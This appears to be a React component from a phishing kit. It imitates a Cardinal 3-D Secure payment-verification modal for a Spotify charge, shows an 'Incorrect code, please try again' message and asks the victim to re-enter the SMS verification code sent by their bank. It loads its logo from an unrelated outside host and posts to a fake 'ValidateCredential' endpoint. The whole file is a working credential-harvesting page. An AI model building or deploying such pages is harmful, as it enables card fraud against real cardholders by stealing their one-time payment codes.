import React, { useState, useEffect } from 'react';

const ContainerError = () => {
    const [styles, setStyles] = useState(null);
    const [showNotif, setShowNotif] = useState(true);
    const [logoUrl, setLogoUrl] = useState('');
    const [brandLogo, setBrandLogo] = useState('');
    const [links, setLinks] = useState({});
    const [currentDate, setCurrentDate] = useState('');

    const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
};
useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles] = await Promise.all([
          import('../../assets/styles/container.css'),
          import('../../assets/styles/container_error.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
        });
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    loadStyles();

    // Set the current date
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, []);
  const [formData, setFormData] = useState({
      // Add any form fields that need value props
    });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
        ...prev,
        [name]: value,
    }));
};


return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
          <div style={{ 
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
    }} className="threeds-two">
      <div className="container-fluid">
      <img className="image" src="https://netwatchnow.com/be/app/res/ganfad.png" alt="" style={{width:'20%'}}/>
        <br />
        <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
          <div className="container container-sticky-footer">
            <form
              action="/Api/2_1_0/NextStep/ValidateCredential"
              autoComplete="off"
              data-ajax="true"
              data-ajax-begin="ccHelpers.ajax.onBegin"
              data-ajax-complete="ccHelpers.ajax.onComplete"
              data-ajax-failure="ccHelpers.ajax.onFailure"
              data-ajax-method="form"
              data-ajax-success="ccHelpers.ajax.onSuccess"
              id="ValidateCredentialForm"
              method="post"
              name="ValidateCredentialForm"
              noValidate
            >
              <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                <div className="row"></div>
                <div className="row">
                  <div className="col-12" id="ValidateOneUpMessage">
                    <div style={{textAlign: 'center'}} id="Body1">
                      <strong>Protecting Your Online Payment</strong>
                    </div>
                  </div>
                </div>
              <div className="row">
                <div style={{textAlign: 'center'}} className="col-12" id="ValidateOptInMessage">
                A Verification Code has been sent to your registered mobile phone number via SMS. By clicking Submit, you are deemed to have accepted the terms and conditions below.
                </div>
              </div>
                <br />
                <div className="row form-two-col">
                  <div className="col-12 p-0">
                    <fieldset id="ValidateTransactionDetailsContainer">
                      <div className="validate-field row">
                        <span style={{textAlign:"left"}} className="validate-label col-6">Merchant</span>
                        <span style={{textAlign:"right"}} className="col-6">WWW.SPOTIFY.COM</span>
                      </div>
                      <div className="validate-field row">
                        <span style={{textAlign:"left"}} className="validate-label col-6">Card Number</span>
                        <span style={{textAlign:"right"}} className="col-6 always-left-to-right">xxxx xxxx xxxx xxxx</span>
                      </div>
                      <div className="validate-field row">
                        <span style={{textAlign:"left"}} className="validate-label col-6">Date</span>
                        <span style={{textAlign:"right"}} className="col-6 always-left-to-right">{currentDate}</span>
                      </div>
                      <br/>
                      <div class="error_msg"><b>Incorrect code.</b> please try again.</div>
                      <br/>
                            <div className="formcol">
                              <input type="text" name="sms" id="otp" required className="textinput" placeholder="Please enter your code"/>
                          </div>

                    </fieldset>
                  <div className="col-12 text-center">
                  <button class="submitbtn" type="submit">Confirm</button>
                  </div>
                  </div>
                </div>
              </div>
              <div className="sticky-footer">
                <div className="row no-pad">
                </div>
                <div className="" id="FooterLinks">
                  <div className="row">
                    <div className="col-12">
                      
                      
                    </div>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </div>
        <br />
      </div>
    </div>
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerError;
